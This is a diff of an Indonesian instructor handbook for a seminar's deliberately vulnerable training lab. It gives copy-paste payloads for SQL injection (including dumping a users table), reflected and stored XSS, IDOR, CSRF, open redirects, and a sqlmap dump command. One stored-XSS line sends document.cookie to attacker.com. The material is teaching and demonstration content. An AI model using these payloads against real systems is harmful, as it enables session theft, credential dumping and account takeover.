@@ -1,108 +1,112 @@
-# 🛡️ ACT LAB :: INSTRUCTOR HANDBOOK (NATIONAL SEMINAR EDITION)
+# 🛡️ ACT LAB :: THE ULTIMATE INSTRUCTOR BIBLE (SEMINAR EDITION)
 
-Buku panduan ini berisi **Payload Langsung** untuk demonstrasi eksploitasi cepat di depan audiens. Gunakan ini untuk menunjukkan kerentanan secara instan.
-
----
-
-## 1. SQL INJECTION :: AUTH BYPASS
-**Target:** Login Page (`/lab/sqli-login`)
-
-### ⚡ Direct Payload (Copy-Paste)
-*   **Username:** `admin`
-*   **Password:** `' OR '1'='1' --`
-*   **Alternative (Nyeleneh):** `admin' --`
-
-### 🛠️ Manual Step-by-Step
-1. Jelaskan bahwa input password tidak divalidasi.
-2. Karakter `'` akan memutus query SQL di server.
-3. Logic `'1'='1'` akan selalu bernilai TRUE, memaksa server memberikan akses tanpa password yang benar.
+Dokumen ini adalah panduan lengkap untuk demonstrasi eksploitasi di ACT LAB. Gunakan payload di bawah ini untuk menunjukkan berbagai teknik serangan dari level Basic hingga Advanced.
 
 ---
 
-## 2. SQL INJECTION :: UNION EXTRACTION
-**Target:** Search Page (`/lab/sqli-union`)
+## 1. SQL INJECTION (SQLi) :: AUTHENTICATION BYPASS
+**Target:** Login Gateway (`/lab/sqli-login`)
+**Tujuan:** Masuk sebagai Admin tanpa mengetahui password.
 
-### ⚡ Direct Payload (Copy-Paste)
-*   **Search Box:** `' UNION SELECT 1,flag,3,4,5,6,7,8 FROM challenges--`
+### ⚡ Daftar Payload (Direct Copy)
+*   **Basic Bypass:** `admin' --`
+*   **Logic Bypass:** `' OR '1'='1' --`
+*   **Double Quote Bypass:** `admin" --`
+*   **No Whitespace (Nyeleneh):** `admin'/**/--`
+*   **Always True Logic:** `' OR 1=1 LIMIT 1 --`
 
-### 🛠️ Manual Step-by-Step
-1. Masukkan `' ORDER BY 8--` untuk membuktikan ada 8 kolom.
-2. Gunakan `UNION SELECT` untuk menggabungkan hasil pencarian dengan data dari tabel lain.
-3. Taruh kolom `flag` di posisi kedua untuk menampilkan Flag rahasia di layar hasil pencarian.
-
----
-
-## 3. XSS (STORED) :: GUESTBOOK ATTACK
-**Target:** Guestbook Page (`/lab/xss-stored`)
-
-### ⚡ Direct Payload (Copy-Paste)
-*   **Message:** `<script>alert('PWNED BY ACT LAB');</script>`
-*   **Alternative (Bypass):** `<img src=x onerror="alert('XSS_SUCCESS')">`
-
-### 🛠️ Manual Step-by-Step
-1. Masukkan script HTML/JS ke dalam form komentar.
-2. Jelaskan bahwa server menyimpan script ini secara permanen di database.
-3. Setiap kali user lain mengunjungi halaman, browser mereka akan menjalankan script tersebut secara otomatis.
+### 🛠️ Metodologi Manual
+1.  **Analisis:** Masukkan `'` (single quote) di field password. Tunjukkan error SQL ke audiens.
+2.  **Penjelasan:** Jelaskan bahwa karakter `'` memutus query asli server.
+3.  **Eksploitasi:** Gunakan `--` (komentar SQL) untuk mematikan sisa query (pengecekan password), sehingga server hanya mengecek username.
 
 ---
 
-## 4. XSS (REFLECTED) :: SEARCH PARAMETER
-**Target:** Search URL (`/lab/xss-reflected`)
+## 2. SQL INJECTION (SQLi) :: UNION-BASED EXTRACTION
+**Target:** Search Engine (`/lab/sqli-union`)
+**Tujuan:** Mencuri data sensitif (Flag/Password) dari tabel lain.
 
-### ⚡ Direct Payload (Copy-Paste URL)
-*   `?q=<marquee><h1>HIJACKED</h1></marquee>`
-*   `?q=<script>alert(document.domain)</script>`
-
-### 🛠️ Manual Step-by-Step
-1. Masukkan payload ke parameter pencarian di URL.
-2. Tunjukkan bahwa input kita "dipantulkan" (reflected) langsung ke halaman tanpa filter, sehingga browser mengeksekusinya sebagai kode HTML.
-
----
-
-## 5. IDOR :: PROFILE MANIPULATION
-**Target:** Profile Viewer (`/lab/idor`)
-
-### ⚡ Direct Payload (Copy-Paste)
-*   Ubah User ID di input menjadi: `1` atau `2`
-
-### 🛠️ Manual Step-by-Step
-1. Login sebagai user biasa (cek ID Anda sendiri, misal 999).
-2. Tunjukkan bahwa dengan hanya mengubah angka ID di input, kita bisa melihat biodata dan email **ADMIN** atau user lain tanpa proteksi.
-3. Jelaskan ini terjadi karena server tidak mengecek apakah user yang merequest punya hak akses ke data tersebut.
+### ⚡ Step-by-Step Payload
+1.  **Cek Jumlah Kolom:**
+    *   `' ORDER BY 8 --` (Membuktikan ada 8 kolom)
+2.  **Cek Kolom yang Muncul di Layar:**
+    *   `' UNION SELECT 1,2,3,4,5,6,7,8 --` (Tunjukkan angka mana yang muncul di UI)
+3.  **Dumping Tabel Users:**
+    *   `' UNION SELECT 1,username,password,email,5,6,7,8 FROM users --`
+4.  **Dumping Flag (Target Utama):**
+    *   `' UNION SELECT 1,flag,3,4,5,6,7,8 FROM challenges --`
 
 ---
 
-## 6. OPEN REDIRECT :: PHISHING GATEWAY
-**Target:** Navigation Gateway (`/lab/redirect`)
+## 3. XSS (REFLECTED) :: CLIENT-SIDE ATTACK
+**Target:** Search Bar (`/lab/xss-reflected`)
+**Tujuan:** Menjalankan script di browser korban via URL.
 
-### ⚡ Direct Payload (Copy-Paste URL)
-*   `?url=https://google.com`
-*   `?url=//evil-phishing.com`
+### ⚡ Daftar Payload Nyeleneh
+*   **Classic:** `<script>alert('PWNED')</script>`
+*   **Image Error (Sering di GitHub):** `<img src=x onerror=alert(1)>`
+*   **SVG Animation:** `<svg/onload=alert(document.domain)>`
+*   **HTML5 Details:** `<details open ontoggle=alert('ACT_LAB')>`
+*   **Marquee Fun:** `<marquee><h1>SYSTEM HIJACKED BY ACT LAB</h1></marquee>`
 
-### 🛠️ Manual Step-by-Step
-1. Tunjukkan link yang tampak resmi dari domain kita.
-2. Begitu diklik, user malah terlempar ke situs luar.
-3. Jelaskan ini sering dipakai attacker untuk membuat link phishing yang terlihat terpercaya.
-
----
-
-## 7. CSRF (CROSS-SITE REQUEST FORGERY)
-**Target:** Account Settings (`/lab/csrf`)
-
-### ⚡ Direct Payload (Exploit Concept)
-*   `api/profile` (POST Request) dengan payload: `{"email": "hacker@evil.com"}`
-
-### 🛠️ Manual Step-by-Step (Burp Suite)
-1. Buka Burp Suite Intercept.
-2. Ubah email di halaman profil, lalu klik "Update".
-3. Tunjukkan di Burp bahwa request ini tidak punya "Anti-CSRF Token".
-4. Jelaskan attacker bisa menjebak user mengklik link jahat yang diam-diam mengganti email mereka.
+### 🛠️ Metodologi Manual
+1.  Tunjukkan bagaimana input di URL `?q=` langsung muncul di halaman tanpa difilter.
+2.  Jelaskan bahwa browser menganggap input kita sebagai kode perintah, bukan teks biasa.
 
 ---
 
-**ACT LAB :: SEMINAR CYBER SECURITY TOOLS**
-*   **Burp Suite:** Intercept & Manipulasi Parameter.
-*   **SQLmap:** Otomasi Dumping Database.
-*   **Developer Tools (F12):** Analisis DOM & Network Request.
+## 4. XSS (STORED) :: PERSISTENT MALWARE
+**Target:** Global Guestbook (`/lab/xss-stored`)
+**Tujuan:** Menanam script permanen di database.
+
+### ⚡ Daftar Payload Pro
+*   **Persistent Popup:** `<script>alert('This message is stored in DB!')</script>`
+*   **Cookie Stealer Simulation:** `<script>new Image().src='http://attacker.com/log?c='+document.cookie;</script>`
+*   **UI Deface:** `<style>body{background:blue !important;}</style><h1>HACKED</h1>`
+
+---
+
+## 5. IDOR :: INSECURE OBJECT REFERENCE
+**Target:** Profile Page (`/lab/idor`)
+**Tujuan:** Melihat data rahasia Admin.
+
+### ⚡ Eksploitasi Cepat
+1.  Buka profil Anda sendiri, lihat di input ID (misal: `999`).
+2.  Ganti ID secara manual menjadi `1`.
+3.  **Hasil:** Profil Admin dan Flag IDOR akan muncul di Bio.
+
+---
+
+## 6. CSRF (CROSS-SITE REQUEST FORGERY)
+**Target:** Profile Settings (`/lab/csrf`)
+**Tujuan:** Mengganti email korban tanpa mereka sadari.
+
+### ⚡ Payload Exploit (Simulasi HTML)
+Bapak bisa jelaskan bahwa attacker membuat file `attack.html` berisi kode ini:
+```html
+<form action="http://act-lab.app/api/profile" method="POST">
+  <input type="hidden" name="email" value="hacker@evil.com" />
+  <input type="hidden" name="bio" value="PWNED BY CSRF" />
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+---
+
+## 7. OPEN REDIRECT :: PHISHING GATEWAY
+**Target:** Navigation Redirect (`/lab/redirect`)
+**Tujuan:** Mengirim user ke situs berbahaya.
+
+### ⚡ Payload Bypass
+*   **Simple:** `?url=https://google.com`
+*   **Protocol Relative:** `?url=//bing.com`
+*   **Double Slash:** `?url=////evil.com`
+
+---
+
+## 🛰️ TOOLBOX INSTRUKTUR
+*   **Burp Suite:** Gunakan untuk menunjukkan "Raw HTTP Request" (sangat disukai audiens pro).
+*   **SQLmap:** Tunjukkan cara otomatisasi SQLi Union.
+    *   Command: `sqlmap -u "http://act-lab.app/api/search?q=test" --batch --dump`
 
 **ACT LAB :: EMPOWERING CYBER SECURITY**
